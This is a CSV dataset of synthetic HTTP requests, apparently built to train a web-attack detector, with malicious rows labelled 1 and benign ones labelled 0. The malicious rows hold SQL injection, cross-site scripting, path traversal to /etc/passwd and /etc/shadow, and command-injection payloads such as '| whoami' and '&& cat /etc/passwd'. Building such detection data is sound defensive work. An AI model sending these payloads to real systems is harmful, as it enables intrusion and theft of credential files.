method,url,headers,body,label
GET,/login?lang=../../../../windows/win.ini,"User-Agent: Mozilla/6.0
X-Request-ID: kILfCmwZ",,1
GET,/checkout?username=<script>alert(1)</script>,"User-Agent: Mozilla/4.0
X-Request-ID: DCqSCkCE",,1
GET,/api/user?search=' AND SLEEP(5)--,"User-Agent: Mozilla/4.0
X-Request-ID: LqkILzgr",,1
PUT,/login?lang=iphone,"User-Agent: Mozilla/6.0
X-Request-ID: ILNCSoKT",,0
POST,/api/user,"User-Agent: Mozilla/4.0
X-Request-ID: mqaKawYi",file=%27%20OR%201%3D1%20--,1
GET,/checkout?search=false,"User-Agent: Mozilla/5.0
X-Request-ID: DsPnGKYF",,0
PUT,/product?q=; ls -la,"User-Agent: Mozilla/4.0
X-Request-ID: uXnxtciI",,1
POST,/product,"User-Agent: Mozilla/5.0
X-Request-ID: joHdWrEK",username=%27%20AND%20SLEEP%285%29--,1
GET,/api/user,"User-Agent: Mozilla/4.0
X-Request-ID: vrZeOIiv",lang=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
PUT,/login,"User-Agent: Mozilla/5.0
X-Request-ID: DtiVCdXn",q=<script>alert(1)</script>,1
GET,/api/user?id=iphone,"User-Agent: Mozilla/4.0
X-Request-ID: bApChvFJ",,0
PUT,"/blog?username="" onmouseover=alert(1) ""","User-Agent: Mozilla/5.0
X-Request-ID: GxdPMmjT",,1
GET,/product,"User-Agent: Mozilla/5.0
X-Request-ID: BiAGvkYd",lang=%27%20UNION%20SELECT%20NULL%2CNULL%20--,1
POST,/search?lang=iphone,"User-Agent: Mozilla/6.0
X-Request-ID: XypxSnWv",,0
PUT,/api/user,"User-Agent: Mozilla/4.0
X-Request-ID: pDCeLZEt",username=%3Cscript%3Ealert%281%29%3C/script%3E,1
POST,/search?file='; DROP TABLE users; --,"User-Agent: Mozilla/5.0
X-Request-ID: hcNPaeZb",,1
GET,/product,"User-Agent: Mozilla/5.0
X-Request-ID: oAQfdmXN",search=| whoami,1
POST,/blog,"User-Agent: Mozilla/6.0
X-Request-ID: CFgSwPaP",lang=../../etc/passwd,1
POST,/login?page=%3B%20ls%20-la,"User-Agent: Mozilla/5.0
X-Request-ID: ppfQJnUS",,1
POST,/blog,"User-Agent: Mozilla/5.0
X-Request-ID: throFsUu",page=' OR 1=1 --,1
PUT,/login?username=true,"User-Agent: Mozilla/6.0
X-Request-ID: mQIjqPQA",,0
PUT,/api/user?username=123,"User-Agent: Mozilla/4.0
X-Request-ID: ORGhoFkh",,0
PUT,"/login?file=' UNION SELECT NULL,NULL --","User-Agent: Mozilla/6.0
X-Request-ID: wjPhtYPi",,1
GET,/product,"User-Agent: Mozilla/6.0
X-Request-ID: XYFTTCRw",search=' OR 'a'='a,1
POST,/api/user?page=%60id%60,"User-Agent: Mozilla/6.0
X-Request-ID: KXohRofX",,1
PUT,/search?lang=123,"User-Agent: Mozilla/4.0
X-Request-ID: rdLFFOjI",,0
GET,/product?lang=iphone,"User-Agent: Mozilla/5.0
X-Request-ID: fQElSDBl",,0
PUT,/api/user,"User-Agent: Mozilla/5.0
X-Request-ID: dVzttCwx",file=%3Cscript%3Ealert%281%29%3C/script%3E,1
PUT,/search,"User-Agent: Mozilla/4.0
X-Request-ID: gYpvRetI",id=%27%3B%20DROP%20TABLE%20users%3B%20--,1
GET,/search?page=category1,"User-Agent: Mozilla/6.0
X-Request-ID: xAfQQETM",,0
GET,/login?page=true,"User-Agent: Mozilla/4.0
X-Request-ID: JKxetgoY",,0
POST,/api/user?search=' OR 'a'='a,"User-Agent: Mozilla/6.0
X-Request-ID: mEVsBMYe",,1
PUT,/search,"User-Agent: Mozilla/6.0
X-Request-ID: tcloMjMF",lang=%27%20OR%20%27a%27%3D%27a,1
PUT,/search?page=iphone,"User-Agent: Mozilla/6.0
X-Request-ID: adiIzkZA",,0
POST,/checkout?q=false,"User-Agent: Mozilla/5.0
X-Request-ID: zexRAMZQ",,0
PUT,/api/user?file=item45,"User-Agent: Mozilla/6.0
X-Request-ID: GnOudJOg",,0
POST,/checkout?username=../../../../windows/win.ini,"User-Agent: Mozilla/6.0
X-Request-ID: uYqPAfTX",,1
POST,/api/user?lang=item45,"User-Agent: Mozilla/5.0
X-Request-ID: QxtOFYOU",,0
PUT,/search?lang=123,"User-Agent: Mozilla/5.0
X-Request-ID: pEBAaBej",,0
POST,"/search?id=' UNION SELECT NULL,NULL --","User-Agent: Mozilla/4.0
X-Request-ID: aJRoayjp",,1
POST,/api/user,"User-Agent: Mozilla/4.0
X-Request-ID: FGJCHFtT",q='; DROP TABLE users; --,1
PUT,/checkout?q=true,"User-Agent: Mozilla/5.0
X-Request-ID: dBQCYAjw",,0
GET,/login?search=%27%20OR%201%3D1%20--,"User-Agent: Mozilla/6.0
X-Request-ID: fEUIkWBs",,1
GET,/blog,"User-Agent: Mozilla/6.0
X-Request-ID: lJoOZruR",lang=%27%20UNION%20SELECT%20NULL%2CNULL%20--,1
GET,/blog?q=english,"User-Agent: Mozilla/5.0
X-Request-ID: XRxNlQbb",,0
POST,/checkout?q=123,"User-Agent: Mozilla/4.0
X-Request-ID: LNqQisro",,0
PUT,/api/user,"User-Agent: Mozilla/4.0
X-Request-ID: iMYDlGsI",search=%3Csvg/onload%3Dalert%281%29%3E,1
POST,/blog?search=john,"User-Agent: Mozilla/5.0
X-Request-ID: aPgOcDNV",,0
PUT,/checkout?lang=../../etc/passwd,"User-Agent: Mozilla/4.0
X-Request-ID: ourRpeio",,1
POST,/api/user?file=%27%20OR%20%27a%27%3D%27a,"User-Agent: Mozilla/5.0
X-Request-ID: BTrQoSSb",,1
PUT,/blog,"User-Agent: Mozilla/4.0
X-Request-ID: dLSKGIbl",username=%27%20AND%20SLEEP%285%29--,1
POST,/product?id=english,"User-Agent: Mozilla/6.0
X-Request-ID: gZNGxRyu",,0
GET,/login?username=laptop,"User-Agent: Mozilla/6.0
X-Request-ID: wCbPrnxN",,0
PUT,/login?id=laptop,"User-Agent: Mozilla/5.0
X-Request-ID: krTFdusE",,0
GET,/login?username=../../../../windows/win.ini,"User-Agent: Mozilla/5.0
X-Request-ID: UgWniPef",,1
PUT,/blog,"User-Agent: Mozilla/6.0
X-Request-ID: VRfiebeP",page=%27%20UNION%20SELECT%20NULL%2CNULL%20--,1
PUT,/search?lang=/etc/shadow,"User-Agent: Mozilla/5.0
X-Request-ID: ofoMBWau",,1
POST,/api/user?lang=item45,"User-Agent: Mozilla/5.0
X-Request-ID: dzTLCsMn",,0
POST,/api/user?lang=category1,"User-Agent: Mozilla/6.0
X-Request-ID: YMMwHljC",,0
POST,/blog,"User-Agent: Mozilla/4.0
X-Request-ID: VjyBgUSF",lang=/etc/shadow,1
POST,/api/user?file=false,"User-Agent: Mozilla/5.0
X-Request-ID: CvbcEAZO",,0
PUT,/search?file=item45,"User-Agent: Mozilla/5.0
X-Request-ID: spNwJHqh",,0
PUT,/checkout?page=' OR 'a'='a,"User-Agent: Mozilla/4.0
X-Request-ID: QewsDPsl",,1
PUT,/product?page='; DROP TABLE users; --,"User-Agent: Mozilla/5.0
X-Request-ID: mszNgboX",,1
PUT,/api/user?username=john,"User-Agent: Mozilla/6.0
X-Request-ID: OFASEiZi",,0
POST,/search?page=item45,"User-Agent: Mozilla/6.0
X-Request-ID: jIHBCeXs",,0
POST,/blog,"User-Agent: Mozilla/4.0
X-Request-ID: WVbdzjEu",username=/etc/shadow,1
GET,/blog?id=../../etc/passwd,"User-Agent: Mozilla/6.0
X-Request-ID: GyTnNHej",,1
PUT,/blog?username=item45,"User-Agent: Mozilla/5.0
X-Request-ID: ytdUbKFg",,0
POST,/search?lang=false,"User-Agent: Mozilla/5.0
X-Request-ID: vLwahySu",,0
GET,/search?file=%27%20AND%20SLEEP%285%29--,"User-Agent: Mozilla/6.0
X-Request-ID: ynzVjUNK",,1
GET,/product?search=category1,"User-Agent: Mozilla/6.0
X-Request-ID: TGkKVQnw",,0
POST,/login?q=laptop,"User-Agent: Mozilla/6.0
X-Request-ID: eLbaPjVV",,0
PUT,/api/user?q=english,"User-Agent: Mozilla/5.0
X-Request-ID: PjDmDoYR",,0
POST,/login?search=category1,"User-Agent: Mozilla/6.0
X-Request-ID: qOlMyBmR",,0
POST,/search?search=/etc/shadow,"User-Agent: Mozilla/4.0
X-Request-ID: ESLFdHBV",,1
PUT,/search?username=' OR 1=1 --,"User-Agent: Mozilla/5.0
X-Request-ID: vqiwSltn",,1
GET,/search,"User-Agent: Mozilla/4.0
X-Request-ID: amDcgguy",lang=<script>alert(1)</script>,1
PUT,/login?username=iphone,"User-Agent: Mozilla/6.0
X-Request-ID: BJOpRbpH",,0
GET,/product,"User-Agent: Mozilla/4.0
X-Request-ID: gfvDcPWz","file=' UNION SELECT NULL,NULL --",1
PUT,/search?lang=iphone,"User-Agent: Mozilla/4.0
X-Request-ID: ylyfDtBG",,0
POST,/search?file=' AND SLEEP(5)--,"User-Agent: Mozilla/5.0
X-Request-ID: xImWtGGT",,1
PUT,/checkout,"User-Agent: Mozilla/6.0
X-Request-ID: engWBBnv",username=| whoami,1
PUT,/search?username=category1,"User-Agent: Mozilla/6.0
X-Request-ID: TaWtLbsS",,0
POST,/checkout?lang=john,"User-Agent: Mozilla/6.0
X-Request-ID: MHCitwUn",,0
GET,/blog?id=english,"User-Agent: Mozilla/5.0
X-Request-ID: JDEqXUgR",,0
POST,/api/user?file=/etc/shadow,"User-Agent: Mozilla/4.0
X-Request-ID: ppORhwIH",,1
GET,/product?id=john,"User-Agent: Mozilla/5.0
X-Request-ID: FokcqRSN",,0
GET,/login,"User-Agent: Mozilla/6.0
X-Request-ID: XYLTrkoP",lang=%26%26%20cat%20/etc/passwd,1
POST,/product?id=item45,"User-Agent: Mozilla/4.0
X-Request-ID: iYkxSKBZ",,0
GET,/api/user,"User-Agent: Mozilla/5.0
X-Request-ID: hjDqdzQE",search=| whoami,1
POST,/login?search=123,"User-Agent: Mozilla/6.0
X-Request-ID: GhEJyTKQ",,0
POST,/product,"User-Agent: Mozilla/5.0
X-Request-ID: EOrupKXi",page=%26%26%20cat%20/etc/passwd,1
GET,/blog?id=../../../../windows/win.ini,"User-Agent: Mozilla/4.0
X-Request-ID: nubdtPef",,1
PUT,/login?username=item45,"User-Agent: Mozilla/6.0
X-Request-ID: VXXfTPBf",,0
PUT,/search?page=true,"User-Agent: Mozilla/4.0
X-Request-ID: MLIpOKQI",,0
POST,/api/user?search=' OR 1=1 --,"User-Agent: Mozilla/5.0
X-Request-ID: vTAMPSit",,1
GET,/api/user?username=123,"User-Agent: Mozilla/4.0
X-Request-ID: APbnzpFp",,0
PUT,/api/user?id=%3Csvg/onload%3Dalert%281%29%3E,"User-Agent: Mozilla/5.0
X-Request-ID: VSKklFfk",,1
PUT,/product?lang=laptop,"User-Agent: Mozilla/6.0
X-Request-ID: RVxHUyBU",,0
PUT,/login?q=../../../../windows/win.ini,"User-Agent: Mozilla/6.0
X-Request-ID: daHBCyPk",,1
PUT,/product?page=123,"User-Agent: Mozilla/4.0
X-Request-ID: jDuyLVAW",,0
GET,/api/user?id=english,"User-Agent: Mozilla/5.0
X-Request-ID: vOEPiMig",,0
PUT,/login,"User-Agent: Mozilla/4.0
X-Request-ID: GZGSRJMS",search=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
PUT,/search?username=123,"User-Agent: Mozilla/6.0
X-Request-ID: TjRTgHqK",,0
GET,/login?id=iphone,"User-Agent: Mozilla/5.0
X-Request-ID: nnsguDQH",,0
GET,/checkout?username=laptop,"User-Agent: Mozilla/6.0
X-Request-ID: BBnpbebK",,0
PUT,/blog?username=123,"User-Agent: Mozilla/5.0
X-Request-ID: WixQZsXL",,0
POST,/login?file=%3Csvg/onload%3Dalert%281%29%3E,"User-Agent: Mozilla/5.0
X-Request-ID: zPHPfbpP",,1
POST,/api/user?file=/etc/shadow,"User-Agent: Mozilla/6.0
X-Request-ID: HNnbFNeu",,1
PUT,/login,"User-Agent: Mozilla/6.0
X-Request-ID: biVkBJYP",page=' OR 1=1 --,1
PUT,/blog?id=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,"User-Agent: Mozilla/4.0
X-Request-ID: jofxRcgW",,1
POST,/product?lang=english,"User-Agent: Mozilla/6.0
X-Request-ID: gjmgCSMB",,0
PUT,/product?lang=john,"User-Agent: Mozilla/5.0
X-Request-ID: tljeeAaX",,0
PUT,"/product?file="" onmouseover=alert(1) ""","User-Agent: Mozilla/4.0
X-Request-ID: mFnnUJyY",,1
GET,/checkout?page=&& cat /etc/passwd,"User-Agent: Mozilla/5.0
X-Request-ID: SMbDuFlt",,1
POST,/search?q=english,"User-Agent: Mozilla/4.0
X-Request-ID: MbtOMeBr",,0
GET,/product?q=<img src=x onerror=alert(1)>,"User-Agent: Mozilla/5.0
X-Request-ID: DvkpWzNw",,1
PUT,/login?username=english,"User-Agent: Mozilla/5.0
X-Request-ID: YRaCVQCx",,0
GET,/product?q=iphone,"User-Agent: Mozilla/6.0
X-Request-ID: rhtHAwkm",,0
POST,/search,"User-Agent: Mozilla/5.0
X-Request-ID: SxKUNQRP",page=%3Csvg/onload%3Dalert%281%29%3E,1
GET,/api/user?username=../../../../windows/win.ini,"User-Agent: Mozilla/6.0
X-Request-ID: KfoLnjCI",,1
GET,/login,"User-Agent: Mozilla/5.0
X-Request-ID: zykLCmyh",lang=%3Cscript%3Ealert%281%29%3C/script%3E,1
POST,/api/user?username=item45,"User-Agent: Mozilla/5.0
X-Request-ID: cZhHRJRW",,0
PUT,/product,"User-Agent: Mozilla/5.0
X-Request-ID: ePfMDYNm",q=%7C%20whoami,1
GET,/checkout?username=english,"User-Agent: Mozilla/5.0
X-Request-ID: AeKWZmRR",,0
POST,/api/user,"User-Agent: Mozilla/4.0
X-Request-ID: JuyzKnkm",page=../../etc/passwd,1
PUT,/search?lang=english,"User-Agent: Mozilla/5.0
X-Request-ID: XwRhzTJx",,0
PUT,/blog,"User-Agent: Mozilla/6.0
X-Request-ID: lKeYHatA",lang=| whoami,1
GET,/checkout?search=%22%20onmouseover%3Dalert%281%29%20%22,"User-Agent: Mozilla/4.0
X-Request-ID: qaelxGMj",,1
GET,/login?search=category1,"User-Agent: Mozilla/5.0
X-Request-ID: dpkJBbbV",,0
POST,/login?search=false,"User-Agent: Mozilla/4.0
X-Request-ID: cBiiAYVl",,0
GET,/checkout?file=%27%20AND%20SLEEP%285%29--,"User-Agent: Mozilla/4.0
X-Request-ID: odmwKYIK",,1
PUT,/search?lang=123,"User-Agent: Mozilla/4.0
X-Request-ID: UzPRfQUO",,0
PUT,/api/user,"User-Agent: Mozilla/6.0
X-Request-ID: IECIYWVP",lang=%27%20UNION%20SELECT%20NULL%2CNULL%20--,1
GET,/login?lang=category1,"User-Agent: Mozilla/4.0
X-Request-ID: sDtDhcmZ",,0
PUT,/product,"User-Agent: Mozilla/5.0
X-Request-ID: KtyZtneG",q=../../etc/passwd,1
PUT,/search?page=false,"User-Agent: Mozilla/6.0
X-Request-ID: UbSTexiG",,0
POST,/product,"User-Agent: Mozilla/5.0
X-Request-ID: ehDfmvuk",file=&& cat /etc/passwd,1
PUT,/api/user?id=/etc/shadow,"User-Agent: Mozilla/5.0
X-Request-ID: uJEVKMOT",,1
PUT,/checkout?lang=category1,"User-Agent: Mozilla/6.0
X-Request-ID: xvKhqBSP",,0
GET,/api/user?file=laptop,"User-Agent: Mozilla/4.0
X-Request-ID: HyVeqFvY",,0
POST,/api/user?file=123,"User-Agent: Mozilla/4.0
X-Request-ID: eSVlACrH",,0
GET,/product?lang=john,"User-Agent: Mozilla/6.0
X-Request-ID: JxxUqtpN",,0
POST,/checkout?id=false,"User-Agent: Mozilla/6.0
X-Request-ID: hJENFdcN",,0
POST,/search?q=`id`,"User-Agent: Mozilla/6.0
X-Request-ID: iAnEtHDR",,1
POST,/blog?lang=true,"User-Agent: Mozilla/4.0
X-Request-ID: CDmZPemG",,0
POST,/product?username=laptop,"User-Agent: Mozilla/5.0
X-Request-ID: KSxQEpGP",,0
POST,/search?username=laptop,"User-Agent: Mozilla/5.0
X-Request-ID: nLmmlUbb",,0
PUT,/product?lang=../../../../windows/win.ini,"User-Agent: Mozilla/4.0
X-Request-ID: UkOfumtJ",,1
PUT,/blog?file=false,"User-Agent: Mozilla/6.0
X-Request-ID: vQMNOqZO",,0
POST,/api/user?file=123,"User-Agent: Mozilla/6.0
X-Request-ID: LLDUENQH",,0
GET,/product?page=true,"User-Agent: Mozilla/4.0
X-Request-ID: YmmGolII",,0
POST,/product?page=category1,"User-Agent: Mozilla/4.0
X-Request-ID: xhvYZaRa",,0
POST,/search?lang=123,"User-Agent: Mozilla/5.0
X-Request-ID: CthrVHsc",,0
POST,/search,"User-Agent: Mozilla/5.0
X-Request-ID: dGJnNHff",search=/etc/shadow,1
GET,/checkout?lang=english,"User-Agent: Mozilla/5.0
X-Request-ID: KWnZdPHe",,0
GET,/login?search=false,"User-Agent: Mozilla/5.0
X-Request-ID: TPOWqXPZ",,0
GET,"/search?username="" onmouseover=alert(1) ""","User-Agent: Mozilla/6.0
X-Request-ID: NVxCADed",,1
GET,/login,"User-Agent: Mozilla/5.0
X-Request-ID: hFYlMguo",file=<svg/onload=alert(1)>,1
GET,/api/user?id=english,"User-Agent: Mozilla/4.0
X-Request-ID: RctwVslM",,0
GET,/checkout?search=category1,"User-Agent: Mozilla/5.0
X-Request-ID: esZHaSIf",,0
PUT,/checkout?search=' OR 'a'='a,"User-Agent: Mozilla/6.0
X-Request-ID: UlnooENK",,1
POST,/search?id=english,"User-Agent: Mozilla/4.0
X-Request-ID: MtJOZsFg",,0
POST,/search?q=iphone,"User-Agent: Mozilla/6.0
X-Request-ID: KbQDHRvI",,0
GET,/blog?file=%27%20UNION%20SELECT%20NULL%2CNULL%20--,"User-Agent: Mozilla/5.0
X-Request-ID: AGwbtHan",,1
PUT,/api/user?file=123,"User-Agent: Mozilla/4.0
X-Request-ID: sZlsqAbG",,0
PUT,/checkout,"User-Agent: Mozilla/4.0
X-Request-ID: HFCGLyYE",lang=| whoami,1
GET,/checkout,"User-Agent: Mozilla/6.0
X-Request-ID: OIEXixaU",file=%27%20AND%20SLEEP%285%29--,1
GET,/login?q=%7C%20whoami,"User-Agent: Mozilla/4.0
X-Request-ID: gorVYHEF",,1
PUT,/api/user,"User-Agent: Mozilla/6.0
X-Request-ID: wHjAjWGe",username=' OR 1=1 --,1
GET,/login,"User-Agent: Mozilla/4.0
X-Request-ID: zZtzaCdK",id=%60id%60,1
POST,/search?lang=true,"User-Agent: Mozilla/5.0
X-Request-ID: xQKylWXu",,0
POST,/search?page=laptop,"User-Agent: Mozilla/4.0
X-Request-ID: jLrEDZuU",,0
POST,/blog,"User-Agent: Mozilla/4.0
X-Request-ID: EmMMFcxo",q=/etc/shadow,1
PUT,/search?search=laptop,"User-Agent: Mozilla/5.0
X-Request-ID: OsnNnahZ",,0
PUT,/product?username=item45,"User-Agent: Mozilla/5.0
X-Request-ID: XezbBtiu",,0
GET,/blog?username=category1,"User-Agent: Mozilla/5.0
X-Request-ID: tKChudtg",,0
GET,/api/user?lang=item45,"User-Agent: Mozilla/5.0
X-Request-ID: FVAPTPQV",,0
GET,/search?id=category1,"User-Agent: Mozilla/5.0
X-Request-ID: JcIVITZa",,0
GET,/search?search=john,"User-Agent: Mozilla/6.0
X-Request-ID: gySoePOz",,0
GET,/checkout?id=john,"User-Agent: Mozilla/6.0
X-Request-ID: IaQOBuzR",,0
GET,/search,"User-Agent: Mozilla/6.0
X-Request-ID: XHaPSWDF","username="" onmouseover=alert(1) """,1
PUT,/api/user,"User-Agent: Mozilla/6.0
X-Request-ID: MNfeZynA",id=%7C%20whoami,1
POST,/login,"User-Agent: Mozilla/6.0
X-Request-ID: RDpLCpvg",search=<script>alert(1)</script>,1
POST,/product?file=%26%26%20cat%20/etc/passwd,"User-Agent: Mozilla/5.0
X-Request-ID: voZsOcgS",,1
PUT,/login?q=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,"User-Agent: Mozilla/5.0
X-Request-ID: nBkuXtQH",,1
POST,/blog,"User-Agent: Mozilla/5.0
X-Request-ID: hIOCAPaj",id=| whoami,1
GET,/checkout?search=123,"User-Agent: Mozilla/4.0
X-Request-ID: LybKQXjm",,0
POST,/api/user?id=item45,"User-Agent: Mozilla/6.0
X-Request-ID: zKORjLyl",,0
GET,/login?id=%27%20OR%201%3D1%20--,"User-Agent: Mozilla/4.0
X-Request-ID: JcwWGqdx",,1
PUT,/search?file=false,"User-Agent: Mozilla/5.0
X-Request-ID: IprqntFp",,0
POST,/blog?lang=%3B%20ls%20-la,"User-Agent: Mozilla/4.0
X-Request-ID: GBFsklQF",,1
POST,/api/user?username=123,"User-Agent: Mozilla/5.0
X-Request-ID: lIbulCKE",,0
PUT,/product?search=%27%3B%20DROP%20TABLE%20users%3B%20--,"User-Agent: Mozilla/5.0
X-Request-ID: twuAIrMy",,1
PUT,/login?page=iphone,"User-Agent: Mozilla/5.0
X-Request-ID: iASsNqta",,0
PUT,/search?page=123,"User-Agent: Mozilla/5.0
X-Request-ID: yYwzKjYN",,0
POST,/blog,"User-Agent: Mozilla/5.0
X-Request-ID: gHzgkVXA",id=<img src=x onerror=alert(1)>,1
PUT,/blog?page=laptop,"User-Agent: Mozilla/5.0
X-Request-ID: XxBxpvkP",,0
GET,/login?page=laptop,"User-Agent: Mozilla/4.0
X-Request-ID: QYohiepe",,0
POST,/login,"User-Agent: Mozilla/6.0
X-Request-ID: BBsMOAUH",q=%3B%20ls%20-la,1
POST,/api/user?lang=iphone,"User-Agent: Mozilla/5.0
X-Request-ID: vsNSRQsa",,0
GET,/product,"User-Agent: Mozilla/5.0
X-Request-ID: DnkgExPn",search=' OR 'a'='a,1
PUT,/api/user,"User-Agent: Mozilla/4.0
X-Request-ID: TAthOIOA",page=%27%20UNION%20SELECT%20NULL%2CNULL%20--,1
POST,/login?file=john,"User-Agent: Mozilla/5.0
X-Request-ID: GtJPztoD",,0
GET,/api/user?q=123,"User-Agent: Mozilla/4.0
X-Request-ID: tMwoorPG",,0
GET,/search?id=' OR 'a'='a,"User-Agent: Mozilla/4.0
X-Request-ID: JvtNMyes",,1
POST,/search,"User-Agent: Mozilla/5.0
X-Request-ID: NYuLXbPQ",lang='; DROP TABLE users; --,1
POST,/login?lang=true,"User-Agent: Mozilla/4.0
X-Request-ID: yofvgRGZ",,0
GET,/product?search=false,"User-Agent: Mozilla/5.0
X-Request-ID: lDZBvttp",,0
GET,/api/user,"User-Agent: Mozilla/5.0
X-Request-ID: ySHhQrSr",search=%3Csvg/onload%3Dalert%281%29%3E,1
GET,/product?q=item45,"User-Agent: Mozilla/5.0
X-Request-ID: fVPEmQto",,0
GET,/product?page=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,"User-Agent: Mozilla/4.0
X-Request-ID: bPInjoRu",,1
POST,/login?id=john,"User-Agent: Mozilla/6.0
X-Request-ID: fqnxiUFv",,0
GET,/checkout?q=%27%20AND%20SLEEP%285%29--,"User-Agent: Mozilla/6.0
X-Request-ID: HcSTvEOC",,1
PUT,/product?search=english,"User-Agent: Mozilla/5.0
X-Request-ID: DeFQkEYo",,0
PUT,/product,"User-Agent: Mozilla/5.0
X-Request-ID: GSVHWPVL",lang=%7C%20whoami,1
POST,/checkout?q=false,"User-Agent: Mozilla/6.0
X-Request-ID: LJLdAzEt",,0
PUT,/blog,"User-Agent: Mozilla/5.0
X-Request-ID: FjxMPJDd",id=' AND SLEEP(5)--,1
PUT,/product,"User-Agent: Mozilla/4.0
X-Request-ID: lyZFKNgP",file=%3Csvg/onload%3Dalert%281%29%3E,1
PUT,/product?page=category1,"User-Agent: Mozilla/4.0
X-Request-ID: xDKkPUgL",,0
GET,/search?username=item45,"User-Agent: Mozilla/4.0
X-Request-ID: KZJbrRDY",,0
PUT,/search?page=%22%20onmouseover%3Dalert%281%29%20%22,"User-Agent: Mozilla/4.0
X-Request-ID: cqnmVLCD",,1
POST,/login?file=laptop,"User-Agent: Mozilla/4.0
X-Request-ID: edQGdqZS",,0
GET,/search?q=&& cat /etc/passwd,"User-Agent: Mozilla/5.0
X-Request-ID: oebuMzqA",,1
PUT,/product,"User-Agent: Mozilla/6.0
X-Request-ID: HidFcLGP","lang="" onmouseover=alert(1) """,1
PUT,/blog?q='; DROP TABLE users; --,"User-Agent: Mozilla/4.0
X-Request-ID: CeJzCpSc",,1
GET,/api/user?lang=%27%20AND%20SLEEP%285%29--,"User-Agent: Mozilla/4.0
X-Request-ID: ClGPbRFO",,1
GET,/checkout?file=true,"User-Agent: Mozilla/5.0
X-Request-ID: UgTPJqSY",,0
GET,/login,"User-Agent: Mozilla/4.0
X-Request-ID: BltylHEc",file=%7C%20whoami,1
PUT,/checkout?username=category1,"User-Agent: Mozilla/5.0
X-Request-ID: SeeYtvDd",,0
POST,/blog,"User-Agent: Mozilla/5.0
X-Request-ID: UnuNlEBU",file=' OR 'a'='a,1
POST,/checkout?lang=iphone,"User-Agent: Mozilla/4.0
X-Request-ID: qkcZPsUX",,0
GET,/checkout?username=%3Csvg/onload%3Dalert%281%29%3E,"User-Agent: Mozilla/5.0
X-Request-ID: gDEKIQLB",,1
PUT,/login?search=english,"User-Agent: Mozilla/6.0
X-Request-ID: dyIdEjas",,0
GET,/api/user,"User-Agent: Mozilla/6.0
X-Request-ID: JqHktRcP",id=%27%20OR%20%27a%27%3D%27a,1
GET,/checkout?username=' OR 'a'='a,"User-Agent: Mozilla/6.0
X-Request-ID: pKsngAXx",,1
POST,/checkout?lang=false,"User-Agent: Mozilla/4.0
X-Request-ID: crQcUtrf",,0
PUT,/checkout?q=category1,"User-Agent: Mozilla/4.0
X-Request-ID: vmNZXFDR",,0
POST,/api/user,"User-Agent: Mozilla/5.0
X-Request-ID: KzHBwwSZ",q=../../etc/passwd,1
GET,/search?username=iphone,"User-Agent: Mozilla/6.0
X-Request-ID: MKcIoXmf",,0
POST,/product?file=../../etc/passwd,"User-Agent: Mozilla/6.0
X-Request-ID: ycDKfluf",,1
POST,/api/user,"User-Agent: Mozilla/4.0
X-Request-ID: kalKzyfz",lang=`id`,1
POST,/search?page=category1,"User-Agent: Mozilla/4.0
X-Request-ID: GIKeYABK",,0
PUT,/search?search=john,"User-Agent: Mozilla/5.0
X-Request-ID: agdTukpN",,0
PUT,/blog?search=123,"User-Agent: Mozilla/6.0
X-Request-ID: GcbNwjQh",,0
PUT,/product?lang=123,"User-Agent: Mozilla/6.0
X-Request-ID: rcekuLee",,0
PUT,/product?file=iphone,"User-Agent: Mozilla/4.0
X-Request-ID: YgvKeRDA",,0
PUT,/product?q=123,"User-Agent: Mozilla/5.0
X-Request-ID: vCZWPDMa",,0
PUT,/search,"User-Agent: Mozilla/6.0
X-Request-ID: NCUkQOJH",page='; DROP TABLE users; --,1
POST,/checkout?lang=iphone,"User-Agent: Mozilla/4.0
X-Request-ID: TKwmJjxu",,0
POST,/blog?lang=' OR 1=1 --,"User-Agent: Mozilla/4.0
X-Request-ID: zfWPkjPA",,1
PUT,/product?id=true,"User-Agent: Mozilla/4.0
X-Request-ID: HcGonQLK",,0
PUT,/api/user?q=laptop,"User-Agent: Mozilla/5.0
X-Request-ID: CNEKREZv",,0
PUT,/api/user?username=<script>alert(1)</script>,"User-Agent: Mozilla/6.0
X-Request-ID: kSEUGxLD",,1
PUT,/api/user?username=&& cat /etc/passwd,"User-Agent: Mozilla/4.0
X-Request-ID: RpwQrTbR",,1
PUT,/api/user?search=category1,"User-Agent: Mozilla/5.0
X-Request-ID: RUThkTRG",,0
POST,/login?search=english,"User-Agent: Mozilla/6.0
X-Request-ID: KrHqjsEs",,0
